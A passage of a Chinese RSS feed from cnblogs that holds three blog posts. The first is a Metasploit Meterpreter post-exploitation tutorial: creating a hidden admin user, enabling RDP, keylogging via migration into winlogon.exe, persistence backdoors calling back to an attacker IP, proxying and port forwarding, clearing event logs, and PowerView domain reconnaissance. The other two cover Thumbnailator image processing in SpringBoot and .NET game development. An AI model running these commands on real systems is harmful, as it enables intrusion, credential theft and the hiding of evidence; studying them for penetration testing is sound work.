&lt;p&gt; 接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008164406640-374344322.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008164334253-294109349.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 我们可以看到，这里成功创建了用户，但是添加到Administrators组中失败了 。我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008164919549-1702749613.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008164931641-2078066641.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;启用远程桌面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。&lt;/p&gt;
&lt;p&gt; 首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e &lt;span class=&quot;Apple-converted-space&quot;&gt; 或者  run post/windows/manage/enable_rdp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008165158453-1583016478.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008165447661-1459949601.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;h3&gt;进程迁移&lt;/h3&gt;
&lt;p&gt;Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。&lt;/p&gt;
&lt;p&gt;在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。&lt;/p&gt;
&lt;p&gt;首先，我们需要使用： ps  命令查看目标设备中运行的进程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008171420241-644732522.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 使用：migrate &lt;span class=&quot;Apple-converted-space&quot;&gt; 目标进程ID&lt;span class=&quot;Apple-converted-space&quot;&gt; 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 &lt;span class=&quot;Apple-converted-space&quot;&gt; kill  pid &lt;span class=&quot;Apple-converted-space&quot;&gt; 命令关闭进程。或者使用自动迁移进程（&lt;code&gt;run post/windows/manage/migrate&lt;/code&gt;）命令，系统会自动寻找合适的进程然后迁移。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008171841459-347274466.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 绑定完成之后，我们就可以开始捕获键盘数据了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008172609267-613623631.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;h3&gt;生成持续性后门&lt;/h3&gt;
&lt;p&gt;因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。&lt;/p&gt;
&lt;p&gt;建立持续性后门有两种方法，一种是通过&lt;strong&gt;启动项启动(persistence) ，&lt;/strong&gt;一种是通过&lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;strong&gt;服务启动(metsvc)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;启动项启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;启动项启动的话，我们先生成一个后门工具，传送门——&amp;gt; 用MSF生成一个后门木马&lt;/p&gt;
&lt;p&gt;然后放到windows的启动目录中：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;服务启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过服务启动，我们可以运行命令 &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
run persistence -X -i &lt;span&gt;5&lt;/span&gt; -p &lt;span&gt;8888&lt;/span&gt; -r &lt;span&gt;192.168&lt;/span&gt;.1&lt;span&gt;.114&lt;/span&gt;  #反弹时间间隔是5s 会自动连接192.&lt;span&gt;168&lt;/span&gt;&lt;span&gt;.1.114的4444端口，缺点是容易被杀毒软件查杀
 
#然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;设置Socks代理&lt;/h3&gt;
&lt;p&gt;这里socks模块只是将代理设置为本地的1080端口，即通过proxychains的流量都转给本地的1080端口，又因为这是MSF起的监听端口。所以我们需要添加一个路由，这样MSF监听的1080端口就可以到达内网了。&lt;/p&gt;
&lt;p&gt;MSF中有三个代理模块，分别是socks4a、socks5、socks_unc。我们一般用 socks4a和socks5进行代理。socks5可以设置用户名和密码。这里运行代理后，有时候MSF不会监听端口(有可能是个bug，试了好多次都有这种情况)，所以也就导致代理失败。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008203434757-1596874883.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#使用socks4a代理
use auxiliary&lt;/span&gt;/server/&lt;span&gt;socks5
run
 
#使用socks5代理
use auxiliary&lt;/span&gt;/server/&lt;span&gt;socks5
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt; USERNAME root
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt; PASSWORD Password@
run
 
#然后打开&lt;/span&gt;/etc/&lt;span&gt;proxychains.conf，加入下面一行
socks5 &lt;/span&gt;&lt;span&gt;0.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt; &lt;span&gt;1080&lt;/span&gt;&lt;span&gt; root Password@
 
#然后添加路由
route add &lt;/span&gt;&lt;span&gt;0.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt; &lt;span&gt;0.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;
 
#然后就可以使用curl了
proxychains nmap &lt;/span&gt;-p &lt;span&gt;21&lt;/span&gt; -Pn -sT x.x.x.x     #在打开其他程序前加上proxychains
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;portfwd端口转发&lt;/h3&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
portfwd add -l &lt;span&gt;3389&lt;/span&gt; -r &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;1.114&lt;/span&gt; -p &lt;span&gt;3389&lt;/span&gt;     #将192.&lt;span&gt;168.1.114&lt;/span&gt;的3389端口转发到本地的3389端口上，这里的192.&lt;span&gt;168.1.114&lt;/span&gt;是获取权限的主机的ip地址
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听。&lt;/p&gt;
&lt;p&gt;然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
rdesktop &lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;:&lt;span&gt;3389&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;清除事件日志&lt;/h3&gt;
&lt;p&gt;完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 &lt;span class=&quot;Apple-converted-space&quot;&gt; clearev  命令来清除事件日志：&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;导入并执行PowerShell脚本&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;load powershell            #加载powershell功能
powershell_import &lt;/span&gt;/root/&lt;span&gt;PowerView.ps1      #导入powershell脚本，提前将该powershell脚本放到指定目录
powershell_execute Get&lt;/span&gt;-NetDomain     #执行该脚本下的功能模块Get-&lt;span&gt;domain，该模块用于获取域信息，一个脚本下通常有多个功能模块
powershell_execute Invoke&lt;/span&gt;-&lt;span&gt;UserHunter  #该功能模块用于定位域管理员登录的主机
powershell_execute Get&lt;/span&gt;-NetForest      #该模块用于定位域信息
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户.&lt;/p&gt;

</description>
<pubDate>Thu, 08 Oct 2020 13:32:00 +0000</pubDate>
<dc:creator>戚源</dc:creator>
<og:description>在上文中我们复现了永恒之蓝漏洞，这里我们学习一下利用msf简单的后渗透阶段的知识/ 一、meterperter常用命令 sysinfo #查看目标主机系统信息 run scraper #查看目标主机详</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/qi-yuan/p/13782842.html</dc:identifier>
</item>
<item>
<title>玩转 SpringBoot2.x 之整合 thumbnailator 图片处理 - 淼淼之森</title>
<link>http://www.cnblogs.com/mmzs/p/13782752.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mmzs/p/13782752.html</guid>
<description>&lt;h2 id=&quot;1、序&quot;&gt;1、序&lt;/h2&gt;
&lt;p&gt;在实际项目中，有时为了响应速度，难免会对一些高清图片进行一些处理，比如图片压缩之类的，而其中压缩可能就是最为常见的。最近，阿淼就被要求实现这个功能，原因是客户那边嫌速度过慢。借此机会，阿淼今儿就给大家介绍一些一下我做这个功能时使用的 &lt;code&gt;Thumbnailator&lt;/code&gt; 库。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Thumbnailator&lt;/code&gt; 是一个优秀的图片处理的 Google 开源 Java 类库，专门用来生成图像缩略图的，通过很简单的 API 调用即可生成图片缩略图，也可直接对一整个目录的图片生成缩略图。两三行代码就能够从现有图片生成处理后的图片，且允许微调图片的生成方式，同时保持了需要写入的最低限度的代码量。可毫不夸张的说，它是一个处理图片十分棒的开源框架。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;支持&lt;/strong&gt;：图片缩放，区域裁剪，水印，旋转，保持比例。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Thumbnailator&lt;/code&gt; 官网：&lt;a href=&quot;https://code.google.com/p/thumbnailator/&quot;&gt;https://code.google.com/p/thumbnailator/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有了这玩意，就不用在费心思使用 Image I/O API,Java 2D API 等等来生成缩略图了。&lt;/p&gt;
&lt;p&gt;废话少说，直接上代码，先来看一个最简单的例子：&lt;/p&gt;
&lt;h2 id=&quot;2、代码示例&quot;&gt;2、代码示例&lt;/h2&gt;
&lt;h4 id=&quot;21-新建一个springboot项目&quot;&gt;2.1. 新建一个springboot项目&lt;/h4&gt;
&lt;h4 id=&quot;22-引入依赖-thumbnailator&quot;&gt;2.2. 引入依赖 thumbnailator&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;net.coobird&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;thumbnailator&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;0.4.8&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;23-controller&quot;&gt;2.3. controller&lt;/h4&gt;
&lt;p&gt;主要实现了如下几个接口作为测试：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@RestController
public class ThumbnailsController {
        @Resource
        private IThumbnailsService thumbnailsService;

        /**
         * 指定大小缩放
         * @param resource
         * @param width
         * @param height
         * @return
         */
        @GetMapping(&quot;/changeSize&quot;)
        public String changeSize(MultipartFile resource, int width, int height) {
                return thumbnailsService.changeSize(resource, width, height);
        }

        /**
         * 指定比例缩放
         * @param resource
         * @param scale
         * @return
         */
        @GetMapping(&quot;/changeScale&quot;)
        public String changeScale(MultipartFile resource, double scale) {
                return thumbnailsService.changeScale(resource, scale);
        }

        /**
         * 添加水印 watermark(位置,水印,透明度)
         * @param resource
         * @param p
         * @param shuiyin
         * @param opacity
         * @return
         */
        @GetMapping(&quot;/watermark&quot;)
        public String watermark(MultipartFile resource, Positions p, MultipartFile shuiyin, float opacity) {
                return thumbnailsService.watermark(resource, Positions.CENTER, shuiyin, opacity);
        }

        /**
         * 图片旋转 rotate(度数),顺时针旋转
         * @param resource
         * @param rotate
         * @return
         */
        @GetMapping(&quot;/rotate&quot;)
        public String rotate(MultipartFile resource, double rotate) {
                return thumbnailsService.rotate(resource, rotate);
        }

        /**
         * 图片裁剪
         * @param resource
         * @param p
         * @param width
         * @param height
         * @return
         */
        @GetMapping(&quot;/region&quot;)
        public String region(MultipartFile resource, Positions p, int width, int height) {
                return thumbnailsService.region(resource, Positions.CENTER, width, height);
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;3、功能实现&quot;&gt;3、功能实现&lt;/h2&gt;
&lt;p&gt;其实引入了这个 &lt;code&gt;Thumbnailator&lt;/code&gt; 类库后，代码其实很少，因为我们只需要按照规则调用其 API 来实现即可。就个人而言，挺喜欢这种 API 的方式，简洁，易懂，明了。&lt;/p&gt;
&lt;h3 id=&quot;31-指定大小缩放&quot;&gt;3.1 指定大小缩放&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 指定大小缩放 若图片横比width小，高比height小，放大 
 * 若图片横比width小，高比height大，高缩小到height，图片比例不变
 * 若图片横比width大，高比height小，横缩小到width，图片比例不变 
 * 若图片横比width大，高比height大，图片按比例缩小，横为width或高为height
 * 
 * @param resource  源文件路径
 * @param width     宽
 * @param height    高
 * @param tofile    生成文件路径
 */
public static void changeSize(String resource, int width, int height, String tofile) {
        try {
                Thumbnails.of(resource).size(width, height).toFile(tofile);
        } catch (IOException e) {
                e.printStackTrace();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1196304/202009/1196304-20200928205215004-1300672961.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;32-指定比例缩放&quot;&gt;3.2 指定比例缩放&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 指定比例缩放 scale(),参数小于1,缩小;大于1,放大
 * 
 * @param resource   源文件路径
 * @param scale      指定比例
 * @param tofile     生成文件路径
 */
public static void changeScale(String resource, double scale, String tofile) {
        try {
                Thumbnails.of(resource).scale(scale).toFile(tofile);
        } catch (IOException e) {
                e.printStackTrace();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1196304/202009/1196304-20200928205334342-415168074.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;33-添加水印&quot;&gt;3.3 添加水印&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 添加水印 watermark(位置,水印,透明度)
 * 
 * @param resource  源文件路径
 * @param p         水印位置
 * @param shuiyin   水印文件路径
 * @param opacity   水印透明度
 * @param tofile    生成文件路径
 */
public static void watermark(String resource, Positions p, String shuiyin, float opacity, String tofile) {
        try {
                Thumbnails.of(resource).scale(1).watermark(p, ImageIO.read(new File(shuiyin)), opacity).toFile(tofile);
        } catch (IOException e) {
                e.printStackTrace();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1196304/202009/1196304-20200928205316498-177269510.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;34-图片旋转&quot;&gt;3.4 图片旋转&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 图片旋转 rotate(度数),顺时针旋转
 * 
 * @param resource  源文件路径
 * @param rotate    旋转度数
 * @param tofile    生成文件路径
 */
public static void rotate(String resource, double rotate, String tofile) {
        try {
                Thumbnails.of(resource).scale(1).rotate(rotate).toFile(tofile);
        } catch (IOException e) {
                e.printStackTrace();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1196304/202009/1196304-20200928205303367-192474576.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;35-图片裁剪&quot;&gt;3.5 图片裁剪&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;/**
 * 图片裁剪 sourceRegion()有多种构造方法，示例使用的是sourceRegion(裁剪位置,宽,高)
 * 
 * @param resource  源文件路径
 * @param p         裁剪位置
 * @param width     裁剪区域宽
 * @param height    裁剪区域高
 * @param tofile    生成文件路径
 */
public static void region(String resource, Positions p, int width, int height, String tofile) {
        try {
                Thumbnails.of(resource).scale(1).sourceRegion(p, width, height).toFile(tofile);
        } catch (IOException e) {
                e.printStackTrace();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1196304/202009/1196304-20200928205249842-407970540.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1.&lt;code&gt;keepAspectRatio(boolean arg0)&lt;/code&gt; 图片是否按比例缩放（宽高比保持不变）默认 &lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;2.&lt;code&gt;outputQuality(float arg0)&lt;/code&gt; 图片质量&lt;/li&gt;
&lt;li&gt;3.&lt;code&gt;outputFormat(String arg0)&lt;/code&gt; 格式转换&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;小结&quot;&gt;小结&lt;/h3&gt;
&lt;p&gt;值得注意的是，若 png、gif 格式图片中含有透明背景，使用该工具压缩处理后背景会变成黑色，这是 &lt;code&gt;Thumbnailator&lt;/code&gt; 的一个 bug，预计后期版本会解决。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代码地址&lt;/strong&gt; ：&lt;a href=&quot;https://github.com/mmzsblog/mmzsblog-util/tree/master/springboot_thumbnails&quot;&gt;https://github.com/mmzsblog/mmzsblog-util/&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 13:10:00 +0000</pubDate>
<dc:creator>淼淼之森</dc:creator>
<og:description>SpringBoot 之整合 thumbnailator 图片处理</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mmzs/p/13782752.html</dc:identifier>
</item>
<item>
<title>使用 .NET 进行游戏开发 - 张善友</title>
<link>http://www.cnblogs.com/shanyou/p/13782644.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/shanyou/p/13782644.html</guid>
<description>&lt;p&gt;微软是一家综合性的网络公司，相信这点来说不用过多的赘述，没有人不知道微软这个公司，这些年因为游戏市场的回报，微软收购了很多的游戏公司还有独立工作室，MC我的世界就是最成功的的案例，现在市值是排在全世界第三的位置，微软游戏也贡献了不少市值，微软的游戏技术堆栈中.NET也是非常大的一部分，他们有 一套全面的工具和服务用来开发游戏，微软的开源项目Orleans（&lt;a title=&quot;https://github.com/dotnet/orleans&quot; href=&quot;https://github.com/dotnet/orleans&quot;&gt;https://github.com/dotnet/orleans&lt;/a&gt;）就是来自于微软的游戏。&lt;/p&gt;
&lt;p&gt;说起游戏腾讯游戏如今是国内乃至全世界都是最大的游戏公司，一直以来为玩家提供了很多优质的游戏作品，其实就拿腾讯代理的这些游戏，哪一款都是世界上最赚钱的游戏，像是DNF，像是LOL英雄联盟，玩家们其实真的应该感谢，能够有如此好的服务器游戏客户端以及运营，多亏了腾讯游戏，甚至现在在手机游戏的市场也是非常可观的，腾讯的王者荣耀就是基于.NET的Unity3d引擎开发的，除此之外还有大量的游戏是基于C#来构建的，腾讯游戏的一个lua的开源项目&lt;a title=&quot;https://github.com/Tencent/xLua&quot; href=&quot;https://github.com/Tencent/xLua&quot;&gt;https://github.com/Tencent/xLua&lt;/a&gt; 提供了C#下Lua编程支持。&lt;/p&gt;
&lt;p&gt;微软.NET团队博客上写了一篇文章使用 .NET 进行游戏开发相关的文章： &lt;a title=&quot;https://devblogs.microsoft.com/dotnet/game-development-with-net/&quot; href=&quot;https://devblogs.microsoft.com/dotnet/game-development-with-net?WT.mc_id=DT-MVP-33797&quot;&gt;https://devblogs.microsoft.com/dotnet/game-development-with-net/&lt;/a&gt; 。 文章重点介绍了使用.NET 进行游戏开发的相关内容，包括游戏引擎、在线服务、开发工具和生态系统等，在dotnet官方网站上增加了一个游戏开发的频道 &lt;a title=&quot;https://dotnet.microsoft.com/apps/games&quot; href=&quot;https://dotnet.microsoft.com/apps/games?WT.mc_id=DT-MVP-33797&quot; target=&quot;_blank&quot;&gt;Game Development with .NET&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/510/202010/510-20201008204120027-1720769411.png&quot;&gt;&lt;img width=&quot;711&quot; height=&quot;337&quot; title=&quot;image&quot; alt=&quot;image&quot; src=&quot;https://img2020.cnblogs.com/blog/510/202010/510-20201008204121168-299810642.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;同时在微软的Learn平台上也发布了&lt;a href=&quot;https://dotnet.microsoft.com/learn/games/unity-tutorial/intro?WT.mc_id=DT-MVP-33797&quot; target=&quot;_blank&quot;&gt;Unity 入门教程&lt;/a&gt;：该教程将让你立即开始使用 Unity 并编写 C# 脚本， 在Learn平台也上线了游戏开发相关教程：&lt;a title=&quot;https://dotnet.microsoft.com/learn/games?WT.mc_id=gamedev-blog-abhamed&quot; href=&quot;https://dotnet.microsoft.com/learn/games&quot;&gt;https://dotnet.microsoft.com/learn/games&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/510/202010/510-20201008204121651-1136523909.png&quot;&gt;&lt;img width=&quot;712&quot; height=&quot;420&quot; title=&quot;image&quot; alt=&quot;image&quot; src=&quot;https://img2020.cnblogs.com/blog/510/202010/510-20201008204122154-351879391.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用 .NET，您可以使用一个代码库支持超过 25 个不同的平台。您可以为 Windows、macOS、Linux、Android、iOS、Xbox、游戏机、任天堂和混合现实设备制作游戏，.NET 不仅仅涵盖构建您的游戏，你也可以用&lt;a href=&quot;https://dotnet.microsoft.com/apps/aspnet?WT.mc_id=DT-MVP-33797&quot; target=&quot;_blank&quot;&gt;ASP.NET&lt;/a&gt; 构建游戏网站，可以使用&lt;a href=&quot;https://dotnet.microsoft.com/apps/xamarin?WT.mc_id=DT-MVP-33797&quot; target=&quot;_blank&quot;&gt;Xamarin&lt;/a&gt; 构建移动应用。&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 12:41:00 +0000</pubDate>
<dc:creator>张善友</dc:creator>
<og:description>微软是一家综合性的网络公司，相信这点来说不用过多的赘述，没有人不知道微软这个公司，这些年因为游戏市场的回报，微软收购了很多的游戏公司还有独立工作室，MC我的世界就是最成功的的案例，现在市值是排在全世界</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/shanyou/p/13782644.html</dc:identifier>
</item>
</channel>
</rss>